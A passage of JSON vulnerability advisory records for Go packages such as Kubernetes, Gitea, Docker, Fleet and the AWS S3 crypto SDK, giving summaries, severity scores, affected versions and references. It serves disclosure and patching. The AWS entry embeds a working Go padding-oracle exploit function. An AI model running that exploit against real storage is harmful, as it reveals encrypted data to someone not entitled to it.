Kubernetes v1.8.x-v1.14.x, schema info is cached by kubectl in the location specified by `--cache-dir` (defaulting to `$HOME/.kube/http-cache`), written with world-writeable permissions (`rw-rw-rw-`). If `--cache-dir` is specified and pointed at a different location accessible to other users/groups, the written files may be modified by other users/groups and disrupt the kubectl invocation. ", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/client-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.8.0"}, {"fixed": "1.12.9"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11244"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/76676"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/77874"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/77874/commits/f228ae3364729caed59087e23c42868454bc3ff4"}, {"type": "WEB", "url": "https://github.com/kubernetes/client-go/commit/790a4f63632139cf6731014d00a9a8338f1fbd7d"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3942"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0020"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0074"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20190509-0002/"}, {"type": "WEB", "url": "http://www.securityfocus.com/bid/108064"}], "database_specific": {"cwe_ids": ["CWE-524", "CWE-732"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-07T17:22:21Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-36h2-95gj-w488", "modified": "2022-02-14T23:00:49Z", "published": "2022-02-09T00:00:28Z", "aliases": ["CVE-2021-45328"], "summary": "Open redirect in Gitea", "details": "Gitea before 1.4.3 is affected by URL Redirection to Untrusted Site ('Open Redirect') via internal URLs.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-gitea/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-45328"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/issues/4332"}, {"type": "WEB", "url": "https://blog.gitea.io/2018/06/release-of-1.4.3/"}, {"type": "PACKAGE", "url": "https://github.com/go-gitea/gitea"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-02-14T23:00:49Z", "nvd_published_at": "2022-02-08T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g44j-7vp3-68cv", "modified": "2021-05-19T22:08:41Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2015-3629"], "summary": "Arbitrary File Write in Libcontainer", "details": "Libcontainer 1.6.0, as used in Docker Engine, allows local users to escape containerization (\"mount namespace breakout\") and write to arbitrary file on the host system via a symlink attack in an image when respawning a container.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0"}, {"fixed": "1.6.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3629"}, {"type": "WEB", "url": "https://github.com/docker/docker/commit/d5ebb60bddbabea0439213501f4f6ed494b23cba"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!searchin/docker-user/1.6.1/docker-user/47GZrihtr-4/nwgeOOFLexIJ"}, {"type": "WEB", "url": "https://groups.google.com/forum/#%21searchin/docker-user/1.6.1/docker-user/47GZrihtr-4/nwgeOOFLexIJ"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-3629"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-updates/2015-05/msg00023.html"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/131835/Docker-Privilege-Escalation-Information-Disclosure.html"}, {"type": "WEB", "url": "http://seclists.org/fulldisclosure/2015/May/28"}, {"type": "WEB", "url": "http://www.securityfocus.com/bid/74558"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-19T22:08:41Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-8459-6rc9-8vf8", "modified": "2023-11-07T14:29:10Z", "published": "2022-02-14T22:52:15Z", "aliases": [], "summary": "Path traversal in github.com/cloudflare/cfrpki/cmd/octorpki", "details": "### Impact\n\nIn the case that a malicious TAL file is parsed pointing to a repository that provides a malicious ROA file which octorpki downloads, it is possible to bypass the current directory traversal mitigation to allow writing outside of the current directory. \n\n### Patches\n\nNo patch release has been made", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/cfrpki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.4.2"}}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/security/advisories/GHSA-8459-6rc9-8vf8"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/commit/a053a808feeb3115c76b6cc263ee55598ce6e8cd"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/commit/eb9cc4db7b7b79e44f56dfaa959fccdfb2af8284"}, {"type": "PACKAGE", "url": "https://github.com/cloudflare/cfrpki"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/releases/tag/v1.4.3"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-02-14T22:52:15Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-w3wf-cfx3-6gcx", "modified": "2022-02-11T23:59:14Z", "published": "2022-02-11T23:59:14Z", "aliases": ["CVE-2020-26276"], "summary": "SAML authentication vulnerability due to stdlib XML parsing", "details": "### Impact\nDue to issues in Go's standard library XML parsing, a valid SAML response may be mutated by an attacker to modify the trusted document. This can result in allowing unverified logins from a SAML IdP.\n\nUsers that configure Fleet with SSO login may be vulnerable to this issue.\n\n### Patches\nThis issue is patched in 3.5.1 using https://github.com/mattermost/xml-roundtrip-validator.\n\n### Workarounds\nIf upgrade to 3.5.1 is not possible, users should disable SSO authentication in Fleet.\n\n### References\nSee https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/ for more information about the underlying vulnerabilities.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@fleetdm.com](mailto:security@fleetdm.com)\n* Join #fleet in [osquery Slack](https://join.slack.com/t/osquery/shared_invite/zt-h29zm0gk-s2DBtGUTW4CFel0f0IjTEw)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/fleetdm/fleet/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.5.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/fleetdm/fleet/security/advisories/GHSA-w3wf-cfx3-6gcx"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26276"}, {"type": "WEB", "url": "https://github.com/fleetdm/fleet/commit/57812a532e5f749c8e18c6f6a652eca65c083607"}, {"type": "WEB", "url": "https://github.com/fleetdm/fleet/blob/master/CHANGELOG.md#fleet-351-dec-14-2020"}, {"type": "WEB", "url": "https://github.com/mattermost/xml-roundtrip-validator"}, {"type": "WEB", "url": "https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities"}], "database_specific": {"cwe_ids": ["CWE-290"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-21T20:46:21Z", "nvd_published_at": "2020-12-17T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4w5x-x539-ppf5", "modified": "2023-08-29T22:09:18Z", "published": "2022-02-11T23:42:20Z", "aliases": ["CVE-2020-26892"], "summary": "Incorrect handling of credential expiry by /nats-io/nats-server", "details": "\n## Problem Description\n\nNATS nats-server through 2020-10-07 has Incorrect Access Control because of how expired credentials are handled.\n\nThe NATS accounts system has expiration timestamps on credentials; the <https://github.com/nats-io/jwt> library had an API which encouraged misuse and an `IsRevoked()` method which misused its own API.\n\nA new `IsClaimRevoked()` method has correct handling and the nats-server has been updated to use this.  The old `IsRevoked()` method now always returns true and other client code will have to be updated to avoid calling it.\n\nThe CVE identifier should cover any application using the old JWT API, where the nats-server is one of those applications.\n\n\n## Affected versions\n\n#### JWT library\n\n * all versions prior to 1.1.0\n * fixed after nats-io/jwt PR 103 landed (2020-10-06)\n\n#### NATS Server\n\n * Version 2 prior to 2.1.9\n   + 2.0.0 through and including 2.1.8 are vulnerable.\n * fixed with nats-io/nats-server PRs 1632, 1635, 1645\n\n\n## Impact\n\nTime-based credential expiry did not work.\n\n\n## Workaround\n\nHave credentials which only expire after fixes can be deployed.\n\n\n## Solution\n\nUpgrade the JWT dependency in any application using it.\n\nUpgrade the NATS server if using NATS Accounts.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/jwt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/nats-io/jwt/security/advisories/GHSA-4w5x-x539-ppf5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26892"}, {"type": "WEB", "url": "https://github.com/nats-io/jwt/commit/e11ce317263cef69619fc1ca743b195d02aa1d8a"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/commit/1e08b67f08e18cd844dce833a265aaa72500a12f"}, {"type": "WEB", "url": "https://advisories.nats.io/CVE/CVE-2020-26892.txt"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/commits/master"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VT67XCLIIBYRT762SVFBYFFTQFVSM3SI/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0380"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2020/11/02/2"}], "database_specific": {"cwe_ids": ["CWE-798"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-21T21:18:09Z", "nvd_published_at": "2020-11-06T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pf59-j7c2-rh6x", "modified": "2023-03-16T17:41:25Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-13597"], "summary": "Exposure of Sensitive Information to an Unauthorized Actor and Insertion of Sensitive Information Into Sent Data in Calico", "details": "Clusters using Calico (version 3.14.0 and below), Calico Enterprise (version 2.8.2 and below), may be vulnerable to information disclosure if IPv6 is enabled but unused. A compromised pod with sufficient privilege is able to reconfigure the node\u2019s IPv6 interface due to the node accepting route advertisement by default, allowing the attacker to redirect full or partial network traffic from the node to the compromised pod.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/projectcalico/calico"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.8.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-13597"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/91507"}, {"type": "WEB", "url": "https://github.com/containernetworking/plugins/pull/484/"}, {"type": "WEB", "url": "https://github.com/containernetworking/plugins/commit/ad10b6fa91aacd720f1f9ab94341a97a82a24965"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/kubernetes-security-announce/BMb_6ICCfp8"}, {"type": "WEB", "url": "https://www.projectcalico.org/security-bulletins/"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-201"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-14T16:27:14Z", "nvd_published_at": "2020-06-03T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f5pg-7wfw-84q9", "modified": "2023-02-07T21:27:07Z", "published": "2022-02-11T23:26:26Z", "aliases": ["CVE-2020-8911"], "summary": "CBC padding oracle issue in AWS S3 Crypto SDK for golang", "details": "### Summary\n\nThe golang AWS S3 Crypto SDK is impacted by an issue that can result in loss of confidentiality and message forgery. The attack requires write access to the bucket in question, and that the attacker has access to an endpoint that reveals decryption failures (without revealing the plaintext) and that when encrypting the CBC option was chosen as content cipher.\n\n### Risk/Severity\n\nThe vulnerability pose insider risks/privilege escalation risks, circumventing KMS controls for stored data.\n\n### Impact\n\nThis advisory describes the plaintext revealing vulnerabilities in the golang AWS S3 Crypto SDK, with a similar issue in the non \"strict\" versions of C++ and Java S3 Crypto SDKs being present as well.\n\nV1 prior to 1.34.0 of the S3 crypto SDK, allows users to encrypt files with AES-CBC, without computing a MAC on the data. Note that there is an alternative option of using AES-GCM, which is used in the examples of the documentation and not affected by this vulnerability, but by CVE-2020-8912.\n\nThis exposes a padding oracle vulnerability: If the attacker has write access to the S3 bucket and can observe whether or not an endpoint with access to the key can decrypt a file (without observing the file contents that the endpoint learns in the process), they can reconstruct the plaintext with (on average) `128*length(plaintext)` queries to the endpoint, by exploiting CBC's ability to manipulate the bytes of the next block and PKCS5 padding errors.\n\nThis issue is fixed in V2 of the API, by disabling encryption with CBC mode for new files. Old files, if they have been encrypted with CBC mode, remain vulnerable until they are reencrypted with AES-GCM.\n\n### Mitigation\n\nUsing the version 2 of the S3 crypto SDK will not produce vulnerable files anymore. Old files remain vulnerable to this problem if they were originally encrypted with CBC mode.\n\n### Proof of concept\n\nA [Proof of concept](https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc) is available in a separate github repository.\n\nThis particular issue is described in [padding_oracle_exploit.go](https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/padding_oracle_exploit.go):\n\n```golang\nfunc PaddingOracleExploit(bucket string, key string, input *OnlineAttackInput) (string, error) {\n\tdata, header, err := input.S3Mock.GetObjectDirect(bucket, key)\n\tif alg := header.Get(\"X-Amz-Meta-X-Amz-Cek-Alg\"); alg != \"AES/CBC/PKCS5Padding\" {\n\t\treturn \"\", fmt.Errorf(\"Algorithm is %q, not CBC!\", alg)\n\t}\n\tlength, err := strconv.Atoi(header.Get(\"X-Amz-Meta-X-Amz-Unencrypted-Content-Length\"))\n\tpadding := byte(len(data) - length)\n\tplaintext := make([]byte, length)\n\tfor i := length - 1; i >= 0; i-- {\n\t\tnewLength := 16 * (i/16 + 1)\n\t\tdataCopy := make([]byte, newLength)\n\t\theaderCopy := header.Clone()\n\t\tcopy(dataCopy, data)\n\t\t// Set Padding\n\t\tnewPadding := byte(newLength - i)\n\t\tfor j := i + 1; j < newLength; j++ {\n\t\t\tvar oldValue byte\n\t\t\tif j >= length {\n\t\t\t\toldValue = padding\n\t\t\t} else {\n\t\t\t\toldValue = plaintext[j]\n\t\t\t}\n\t\t\tdataCopy, headerCopy, err = xorData(oldValue^newPadding, j, dataCopy, headerCopy)\n\t\t\tif err != nil {\n\t\t\t\treturn \"\", err\n\t\t\t}\n\t\t}\n\t\t// Guess\n\t\tfor c := 0; c < 256; c++ {\n\t\t\tdataCopy, headerCopy, err := xorData(byte(c)^newPadding, i, dataCopy, headerCopy)\n\t\t\tinput.S3Mock.PutObjectDirect(bucket, key+\"guess\", dataCopy, headerCopy)\n\t\t\tif input.Oracle(bucket, key+\"guess\") {\n\t\t\t\tplaintext[i] = byte(c)\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tdataCopy, headerCopy, err = xorData(byte(c)^newPadding, i, dataCopy, headerCopy)\n\t\t}\n\t}\n\treturn string(plaintext), nil\n}\n```", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/aws/aws-sdk-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.34.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/google/security-research/security/advisories/GHSA-f5pg-7wfw-84q9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8911"}, {"type": "WEB", "url": "https://github.com/aws/aws-sdk-go/pull/3403"}, {"type": "WEB", "url": "https://github.com/aws/aws-sdk-go/commit/1e84382fa1c0086362b5a4b68e068d4f8518d40e"}, {"type": "WEB", "url": "https://github.com/aws/aws-sdk-go/commit/ae9b9fd92af132cfd8d879809d8611825ba135f4"}, {"type": "WEB", "url": "https://aws.amazon.com/blogs/developer/updates-to-the-amazon-s3-encryption-client/?s=09"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1869800"}, {"type": "PACKAGE", "url": "https://github.com/aws/aws-sdk-go"}, {"type": "WEB", "url": "https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0646"}], "database_specific": {"cwe_ids": ["CWE-327"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T17:57:15Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-f5fj-7265-jxhj", "modified": "2023-10-02T11:50:26Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2018-1000803"], "summary": "Gitea Exposes Private Email Addresses", "details": "Gitea version prior to version 1.5.1 contains a CWE-200 vulnerability that can result in Exposure of users private email addresses. This attack appear to be exploitable via Watch a repository to receive email notifications. Emails received contain the other recipients even if they have the email set as private. This vulnerability appears to have been fixed in 1.5.1.\n\n### Specific Go Packages Affected\ngithub.com/go-gitea/gitea/models", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-gitea/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1000803"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/4664"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/4664/files#diff-146e0c2b5bb1ea96c9fb73d509456e57"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/commit/194a11eb110cd98fc2ba52861abf7770db6885a3"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T18:09:38Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-9689-rx4v-cqgc", "modified": "2023-10-02T11:43:16Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2018-15798"], "summary": "Pivotal Concourse Open Redirect in Login Flow", "details": "Pivotal Concourse Release, versions 4.x prior to 4.2.2, login flow allows redirects to untrusted websites. A remote unauthenticated attacker could convince a user to click on a link using the oAuth redirect link with an untrusted website and gain access to that user's access token in Concourse.\n\n### Specific Go Packages Affected\ngithub.com/concourse/concourse/skymarshal/skyserver", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/concourse/concourse"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.2.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/concourse/concourse"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "5.3.0"}, {"fixed": "5.5.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/concourse/concourse"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "5.6.0"}, {"fixed": "5.8.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-15798"}, {"type": "WEB", "url": "https://github.com/concourse/concourse/pull/5350/commits/38cb4cc025e5ed28764b4adc363a0bbf41f3c7cb"}, {"type": "WEB", "url": "https://github.com/concourse/concourse/blob/release/5.2.x/release-notes/v5.2.8.md"}, {"type": "WEB", "url": "https://pivotal.io/security/cve-2018-15798"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T18:15:16Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-ch68-7cf4-35vr", "modified": "2022-02-07T21:57:38Z", "published": "2022-02-07T21:57:38Z", "aliases": ["CVE-2022-23600"], "summary": "Limited ability to spoof SAML authentication with missing audience verification in Fleet", "details": "### Impact\n\nThis impacts deployments using SAML SSO in two specific cases:\n\n1. A malicious or compromised Service Provider (SP) could reuse the SAML response to log into Fleet as a user -- only if the user has an account with the same email in Fleet, _and_ the user signs into the malicious SP via SAML SSO from the same Identity Provider (IdP) configured with Fleet.\n2. A user with an account in Fleet could reuse a SAML response intended for another SP to log into Fleet. This is only a concern if the user is blocked from Fleet in the IdP, but continues to have an account in Fleet. If the user is blocked from the IdP entirely, this cannot be exploited.\n\n### Patches\nFleet 4.9.1 resolves this issue.\n\n### Workarounds and good practices\n* Reduce the length of sessions on your IdP to reduce the window for malicious re-use.\n* Limit the amount of SAML Service Providers/Applications used by user accounts with access to Fleet.\n* When removing access to Fleet in the IdP, delete the Fleet user from Fleet as well.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Join us in the #fleet channel of [osquery Slack](https://join.slack.com/t/osquery/shared_invite/zt-h29zm0gk-s2DBtGUTW4CFel0f0IjTEw).\n* Email us at [security@fleetdm.com](mailto:security@fleetdm.com).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/fleetdm/fleet/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.9.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/fleetdm/fleet/security/advisories/GHSA-ch68-7cf4-35vr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23600"}, {"type": "WEB", "url": "https://github.com/fleetdm/fleet/commit/35d5a7b285f15ddd47486fa656e8b1acf3d48374"}, {"type": "PACKAGE", "url": "https://github.com/fleetdm/fleet"}], "database_specific": {"cwe_ids": ["CWE-284", "CWE-287"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-02-03T17:19:00Z", "nvd_published_at": "2022-02-04T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hv53-vf5m-8q94", "modified": "2022-09-19T22:53:33Z", "published": "2022-02-11T23:28:20Z", "aliases": [], "summary": "personnummer/go vulnerable to Improper Input Validation", "details": "This vulnerability was reported to the personnummer team in June 2020. The slow response was due to locked ownership of some of the affected packages, which caused delays to update packages prior to disclosure.\n\nThe vulnerability is determined to be low severity.\n\n### Impact\n\nThis vulnerability impacts users who rely on the for last digits of personnummer to be a _real_ personnummer.  \n\n### Patches\n\nThe issue have been patched in all repositories. The following versions should be updated to as soon as possible:\n\n[C#](https://github.com/advisories/GHSA-qv8q-v995-72gr) 3.0.2  \nD 3.0.1  \n[Dart](https://github.com/advisories/GHSA-4xh4-v2pq-jvhm) 3.0.3  \nElixir 3.0.0  \n[Go](https://github.com/advisories/GHSA-hv53-vf5m-8q94) 3.0.1  \n[Java](https://github.com/advisories/GHSA-q3vw-4jx3-rrr2) 3.3.0  \n[JavaScript](https://github.com/advisories/GHSA-vpgc-7h78-gx8f) 3.1.0  \nKotlin 1.1.0  \nLua 3.0.1  \n[PHP](https://github.com/advisories/GHSA-2p6g-gjp8-ggg9) 3.0.2  \nPerl 3.0.0  \n[Python](https://github.com/advisories/GHSA-rxq3-5249-8hgg) 3.0.2  \n[Ruby](https://github.com/advisories/GHSA-vp9c-fpxx-744v) 3.0.1  \n[Rust](https://github.com/advisories/GHSA-28r9-pq4c-wp3c) 3.0.0  \nScala 3.0.1  \nSwift 1.0.1  \n\nIf you are using any of the earlier packages, please update to latest.\n\n### Workarounds\n\nThe issue arrieses from the regular expression allowing the first three digits in the last four digits of the personnummer to be\n000, which is invalid. To mitigate this without upgrading, a check on the last four digits can be made to make sure it's not\n000x.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [Personnummer Meta](https://github.com/personnummer/meta/issues)\n* Email us at [Personnummer Email](mailto:security@personnummer.dev)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/personnummer/go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.0.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/personnummer/go/security/advisories/GHSA-hv53-vf5m-8q94"}, {"type": "PACKAGE", "url": "https://github.com/personnummer/go/"}, {"type": "WEB", "url": "https://pkg.go.dev/github.com/personnummer/go"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-24T17:26:30Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-wqv3-8cm6-h6wg", "modified": "2023-01-06T22:23:41Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-8558"], "summary": "Improper Authentication in Kubernetes", "details": "A security issue was discovered in the Kubelet and kube-proxy components of Kubernetes which allows adjacent hosts to reach TCP and UDP services bound to 127.0.0.1 running on the node or in the node's network namespace. For example, if a cluster administrator runs a TCP service on a node that listens on 127.0.0.1:1234, because of this bug, that service would be potentially reachable by other hosts on the same LAN as the node, or by containers running on the same node as the service. If the example service on port 1234 required no additional authentication (because it assumed that only other localhost processes could reach it), then it could be vulnerable to attacks that make use of this bug.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.18.0"}, {"fixed": "1.18.4"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.17.0"}, {"fixed": "1.17.7"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.16.11"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/bottlerocket-os/bottlerocket/security/advisories/GHSA-wqv3-8cm6-h6wg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8558"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/92315"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1843358"}, {"type": "WEB", "url": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8558"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://github.com/tabbysable/POC-2020-8558"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-announce/c/sI4KmlH3S2I/m/TljjxOBvBQAJ"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/B1VegbBDMTE"}, {"type": "WEB", "url": "https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20200821-0001/"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2020/07/08/1"}], "database_specific": {"cwe_ids": ["CWE-420"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-24T19:30:36Z", "nvd_published_at": "2020-07-27T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vfp4-xx6m-7vf6", "modified": "2021-05-13T20:25:19Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-7010"], "summary": "Cryptographic Issues in ECK", "details": "Elastic Cloud on Kubernetes (ECK) versions prior to 1.1.0 generate passwords using a weak random number generator. If an attacker is able to determine when the current Elastic Stack cluster was deployed they may be able to more easily brute force the Elasticsearch credentials generated by ECK.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/elastic/cloud-on-k8s"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7010"}, {"type": "WEB", "url": "https://www.elastic.co/community/security/"}], "database_specific": {"cwe_ids": ["CWE-335"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": 